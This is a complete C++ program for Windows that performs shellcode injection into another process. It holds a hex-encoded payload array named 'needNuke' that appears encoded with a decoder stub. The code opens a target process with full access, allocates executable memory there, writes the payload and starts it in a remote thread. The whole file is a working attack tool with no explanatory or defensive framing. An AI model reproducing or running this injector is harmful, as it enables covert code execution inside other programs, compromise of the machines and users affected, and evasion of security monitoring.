#include <windows.h>
#include <stdio.h>
#include "ProcessUtil.h"
#include <iostream>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";


DWORD TID = NULL;
DWORD PID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char needNuke[] = 

"\xdb\xdb\xbd\x4a\x35\xac\x04\xd9\x74\x24\xf4\x5e"
"\x33\xc9\xb1\x46\x83\xc6\x04\x31\x6e\x13\x03\x24"
"\x26\x4e\xf1\x44\x00\x0d\x1e\x44\x79\xd1\xdf\xa4"
"\x7a\x93\x8e\xe5\x2a\x41\x60\xb3\x82\x54\x50\x5e"
"\x5b\x1c\x06\xc0\x13\xa9\xf5\x18\xec\x26\xab\x38"
"\xa4\xb3\x3e\x68\x7c\xcb\x09\xc2\x36\x9e\x44\x1b"
"\x8e\x11\x67\x37\x33\x33\x1b\x45\x60\x93\xa2\x88"
"\xb1\xde\x65\x0b\x83\x03\x88\x59\x42\x95\x1b\xd6"
"\x16\x35\x17\xaa\xaa\x7d\x26\xfa\x58\xfd\xa0\xfa"
"\x5e\xfe\xf8\x7f\x9e\x8a\x9f\x37\x1e\xa3\x30\x4c"
"\x68\x5b\xf5\xd9\x29\x7b\xbc\xdc\x79\x98\x68\x96"
"\x86\x96\xd4\xad\x4d\xa1\x9f\xb0\x7b\xfc\x2e\x7b"
"\xcb\xce\x90\xd7\x8d\xf1\xd8\x2a\x4f\xf3\x1b\x0c"
"\xaf\x86\x6a\x20\x2c\x25\xa9\xb0\x77\x8c\x60\xb5"
"\xaf\xb6\xc6\xbe\x10\x63\x8e\xc1\x40\x0d\x51\x4a"
"\x6c\x9a\x15\xc7\x2d\x06\xdf\xd6\x7d\x77\x54\xdc"
"\xf5\x30\x6b\x0c\x44\x99\x2a\xf4\x19\x40\xf7\x45"
"\xfe\x33\x5e\x04\xa4\xfb\xe3\x6a\x78\xbd\xb1\x8d"
"\x99\x65\x77\x28\x00\xde\xfc\xd8\x5d\x89\xfd\x23"
"\x62\x6b\x4a\x61\x9c\x94\x4a\x95\x9f\x94\x4a\x95"
"\xd7\x19\xc7\x94\xe6\x21\xd8\xd7\x52\x10\x53\xb8"
"\x25\xac\xb6\xfd\xda\xe6\x9b\x57\x5a\xb3\x7a\xc2"
"\xe1\x5e\x7d\x39\x51\xe2\x46\xe9\x5e\xe2\x3a\xe3"
"\x1e\x11\x22\x86\x1b\x5d\xe4\x7b\x56\xce\x81\x7b"
"\xcf\x51\xdf\xa1\x10\x84\xbc\x34\x83\x44\x6d\xd3"
"\x23\xee\x71";

int main() {
	DWORD PID = GetSelectedProcessId();

	if (PID == 0) {
		printf("No valid process ID found.\n");
		return EXIT_FAILURE;
	}

	printf("Trying to open a handle to process (%lu)\n", PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		false,
		PID
	);

	if (hProcess == NULL) {
		printf("%s couldn't get handle to process (%1d), error: %1d", e, PID, GetLastError());
		return EXIT_FAILURE; 
	}
	
	printf("%s got a handle to the process!\n\---0x%p\n", k, hProcess);

	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(needNuke),
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE);

	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(needNuke));

	WriteProcessMemory(
		hProcess,
		rBuffer,
		needNuke,
		sizeof(needNuke),
		NULL
	);

	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(needNuke));

	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		NULL,
		&TID

	);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %1d", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;

	}

	printf("%s got a handle to the thread (%1d)\n---0x%p\n", k, TID, hThread);
	
	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", i);


	printf("%s cleaning up\n", i);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("%s done!\n", k);

	return EXIT_SUCCESS;
}